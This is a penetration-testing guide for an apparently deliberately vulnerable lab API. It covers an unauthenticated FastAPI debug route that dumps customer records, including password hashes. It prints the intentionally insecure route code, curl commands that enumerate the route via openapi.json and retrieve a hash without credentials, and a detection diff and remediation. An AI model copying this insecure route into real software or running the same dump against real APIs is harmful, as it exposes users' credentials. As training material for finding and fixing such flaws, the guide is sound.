# API9 — Improper Inventory Management · VulnMNO Pentest Guide

> **Status: live — implemented and verified.** The exploitation steps below
> were run against a live instance and the outputs shown are real.

OWASP API Security reference: **API9:2023 — Improper Inventory Management.**

## Where it lives

- **Endpoint:** `GET /api/customers/_debug/{customerId}`
- **Code:** `app/routers/customers.py::debug_dump_customer`

```python
@router.get("/_debug/{customerId}")
async def debug_dump_customer(
    customerId: str,
    session: Annotated[AsyncSession, Depends(get_session)],
):
    c = (
        await session.execute(select(Customer).where(Customer.public_id == customerId))
    ).scalar_one_or_none()
    if c is None:
        raise not_found("Customer not found")
    return {col.name: getattr(c, col.name) for col in Customer.__table__.columns}
```

## Why it is API9

The route has **no** `Depends(get_current_customer)` — no authentication at
all — and dumps every raw ORM column, including `password_hash` and
`otp_fixed_code`, fields that never appear in any of the hand-written
response schemas (`CustomerRead` etc.). It is mounted on the live `app` like
any other router, so FastAPI serves it and lists it in the
auto-generated `/openapi.json` — but it was never added to the
hand-maintained contract at `stages/02_api_contract/output/openapi.yaml`.
The generated schema and the team's own source-of-truth contract disagree
about what API surface exists; that mismatch **is** the finding.

## How to find it (static analysis / the actual diffing check)

```bash
curl -s http://localhost:8000/openapi.json | python3 -c \
  "import sys,json; d=json.load(sys.stdin); [print(p) for p in d['paths'] if '_debug' in p]"
```

## Verified exploitation (actual run)

```bash
curl -s http://localhost:8000/api/customers/_debug/CUST-10001
```

No `Authorization` header sent. Actual response fields:

```
"public_id":"CUST-10001"
"primary_msisdn":"+34600000001"
"password_hash":"$argon2id$v=19$m=65536,t=3,p=4$EOaGlSA6pyvCQG7ZV1YqXA$crOTFZ/UPW0mOMVWU3+0CNy1krXiphS56QqyJg6Bldk"
"otp_fixed_code":null
```

`200 OK`, zero credentials presented — the Argon2 password hash for a real
seed customer, readable by anyone who can reach the API port. Also confirmed
present in the live schema:

```bash
curl -s http://localhost:8000/openapi.json | grep -o '"/api/customers/_debug/{customerId}"'
# -> "/api/customers/_debug/{customerId}"
```

(This same route is the one chained from the
[API7 SSRF guide](API7-Server-Side-Request-Forgery.md) — the backend's own
loopback fetch reached exactly this endpoint, unauthenticated, from inside.)

## Blue-team detection

```bash
# CI check: any route the running app serves that isn't in the maintained contract
diff <(curl -s http://<host>/openapi.json | jq -r '.paths | keys[]' | sort) \
     <(yq '.paths | keys[]' stages/02_api_contract/output/openapi.yaml | sort)
```

Run this as a build gate, not just an incident-response query — that's the
actual remediation for the *process* gap, independent of deleting this one
route.

## Remediation

1. Delete the route — it was never meant to ship.
2. Turn the diff check above into a CI gate so the next forgotten debug
   route can't reach a running deployment silently.
